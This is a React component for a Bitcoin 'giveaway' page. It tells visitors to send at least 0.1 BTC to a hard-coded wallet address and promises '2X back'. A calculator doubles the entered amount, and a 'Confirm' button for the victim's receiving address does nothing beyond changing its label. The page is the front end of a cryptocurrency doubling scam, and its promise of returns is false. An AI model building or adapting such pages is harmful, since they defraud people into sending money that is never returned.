import { useState } from "react";

export default function BNB() {
    const [amount, setAmount] = useState('');
    const [approve, setApporve] = useState(false);
    const [copied, setCopied] = useState(false);

    const Address = "Osas is a champ";

    function handleAmount(event) {
        const inputValue = parseFloat(event.target.value);
        if (isNaN(inputValue) || inputValue < 0.1) {
            setAmount(0);
        } else {
            setAmount(inputValue * 2);
        }
    }


    function handleApprove() {
        setApporve(true);
    }

    const copyText = () => {
        navigator.clipboard.writeText(Address)
            .then(() => {
                setCopied(true);
                setTimeout(() => {
                    setCopied(false);
                }, 2000);
            })
            .catch(err => {
                console.error("Failed to copy: ", err);
            });
    };

    return (
        <>
            <div className="form formContainer participateRight">
                <div className="title">
                    <p> Make a transfer to the <span>specified</span> address to receive <span>2X</span> back </p>
                    <div className="waiting"><img src="/assets/258f73b8.svg" width="24" alt="" /><span>Waiting for
                        payment</span></div>
                </div>
                <div className="formGroup">
                    <div className="formInput formInputWithButton">
                        <p>Participation wallet</p>
                        <div className="input">
                            <div className="value">bc1qs7r5gnfpe5pcy5zt6afpe7mh6m4mwh774yzmh3</div>
                        </div><button onClick={copyText} className="">{copied ? "Copied!" : "Copy address"}</button>
                    </div>
                    <div className="formInput formInputWithButton">
                        <p>Participation amount</p>
                        <div className="input"><span className="errorText"> The minimum value allowed is
                            0.1</span><span>BTC</span></div><button className="disabled"> Copy amount </button>
                    </div>
                </div>
            </div>

            <div className="calculator participateLeft">
                <div className="calculatorInput formContainer">
                    <div className="title"> Enter the amount </div>
                    <div className="block">
                        <div className="info">
                            <div className="header"><img
                                src="data:image/png;base64,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"
                                alt="bitcoin" className="icon" width="24" /><span className="name">Bitcoin</span></div>
                        </div>
                        <div className="formGroup">
                            <div><label className="input"><input onChange={handleAmount} placeholder="Enter Amount" type="number" /><span className="currency">BTC</span></label>
                                <div className="group"><small className="small"> Min: <span>0.1 BTC</span></small><small
                                    className="small"> Max: <span>250 BTC</span></small></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="calculatorInput formContainer">
                    <div className="title"> Amount to receive <span>2X</span> back </div>
                    <div className="block">
                        <div className="info">
                            <div className="header"><img
                                src="data:image/png;base64,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"
                                alt="bitcoin" className="icon" width="24" /><span className="name">Bitcoin</span></div>
                        </div>
                        <div><label className="input"><input defaultValue={amount} placeholder="Waiting for input..." type="number" /><span
                            className="currency">BTC</span></label>
                            <div className="group"><small className="small"> Min: <span>0.2 BTC</span></small><small
                                className="small"> Max: <span>500 BTC</span></small></div>
                        </div>
                    </div>
                    <div className="formInput-2 formInput  formInputWithButton">
                        <p>Recipient Address</p>
                        <input className="input"
                            placeholder="receivers wallet address" type="text" /><button onClick={handleApprove} className={approve ? "clicked" : ""}>{approve ? "Saved" : "Confirm"}</button>
                    </div>
                </div>
            </div>

        </>
    )
}
